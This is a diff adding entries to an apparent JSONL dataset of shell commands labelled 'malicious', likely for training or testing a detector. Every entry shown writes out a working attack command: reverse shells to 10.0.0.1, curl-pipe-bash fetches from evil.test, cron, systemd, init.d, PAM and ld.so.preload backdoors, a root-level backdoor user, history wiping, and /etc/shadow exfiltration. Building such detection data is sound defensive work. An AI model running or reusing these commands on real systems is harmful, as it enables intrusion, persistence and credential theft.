@@ -13,3 +13,18 @@
 {"id": "b13", "label": "malicious", "desc": "anti forensics", "command": "ln -sf /dev/null ~/.bash_history && export HISTFILE=/dev/null && export HISTSIZE=0"}
 {"id": "b14", "label": "malicious", "desc": "download and exec", "command": "curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x"}
 {"id": "b15", "label": "malicious", "desc": "profile backdoor", "command": "echo 'curl -s http://evil.test/c2 | bash &' >> /etc/profile"}
+{"id": "b16", "label": "malicious", "desc": "base64 encoded payload", "command": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash"}
+{"id": "b17", "label": "malicious", "desc": "init.d persistence", "command": "cat > /etc/init.d/sysupdate << 'EOF'\n#!/bin/bash\ncurl http://evil.test/update | bash\nEOF\nchmod +x /etc/init.d/sysupdate"}
+{"id": "b18", "label": "malicious", "desc": "pam backdoor", "command": "echo 'auth sufficient pam_permit.so' > /etc/pam.d/su"}
+{"id": "b19", "label": "malicious", "desc": "named pipe reverse shell", "command": "mkfifo /tmp/.p; cat /tmp/.p | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/.p &"}
+{"id": "b20", "label": "malicious", "desc": "cron.d persistence", "command": "echo '*/5 * * * * root curl http://evil.test/c2 | bash' > /etc/cron.d/update"}
+{"id": "b21", "label": "malicious", "desc": "socat reverse shell", "command": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444"}
+{"id": "b22", "label": "malicious", "desc": "python reverse shell", "command": "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\""}
+{"id": "b23", "label": "malicious", "desc": "timestomp evasion", "command": "cp /bin/bash /tmp/.svc && chmod u+s /tmp/.svc && touch -t 202001010000 /tmp/.svc"}
+{"id": "b24", "label": "malicious", "desc": "process masquerade", "command": "cp /tmp/.x /tmp/.x 2>/dev/null; exec -a '[kworker/0:0]' /bin/bash -c 'curl http://evil.test/c2 | bash' &"}
+{"id": "b25", "label": "malicious", "desc": "signal trap evasion", "command": "trap '' INT TERM HUP; while true; do curl -s http://evil.test/beacon; sleep 60; done &"}
+{"id": "b26", "label": "malicious", "desc": "gcc rootkit compile", "command": "echo 'void __attribute__((constructor)) init(){system(\"curl evil.test/c2|bash\");}' > /tmp/r.c && gcc -shared -fPIC -o /tmp/r.so /tmp/r.c 2>/dev/null && echo /tmp/r.so >> /etc/ld.so.preload"}
+{"id": "b27", "label": "malicious", "desc": "ssh tunnel c2", "command": "ssh -N -f -R 4444:localhost:22 attacker@10.0.0.1 2>/dev/null &"}
+{"id": "b28", "label": "malicious", "desc": "firewall disable exfil", "command": "iptables -F && iptables -P INPUT ACCEPT && iptables -P OUTPUT ACCEPT && cat /etc/shadow | base64 | curl -X POST -d @- http://evil.test/exfil"}
+{"id": "b29", "label": "malicious", "desc": "systemd timer persist", "command": "mkdir -p /etc/systemd/system && echo -e '[Unit]\\nDescription=Update\\n[Timer]\\nOnCalendar=*:0/5\\n[Install]\\nWantedBy=timers.target' > /etc/systemd/system/update.timer && systemctl enable update.timer 2>/dev/null"}
+{"id": "b30", "label": "malicious", "desc": "multi-stage attack", "command": "useradd -o -u 0 backdoor 2>/dev/null; echo 'backdoor:password' | chpasswd 2>/dev/null; mkdir -p /root/.ssh; echo 'ssh-rsa AAAAB3attack' >> /root/.ssh/authorized_keys; echo '* * * * * curl http://evil.test/c2|bash' | crontab -"}
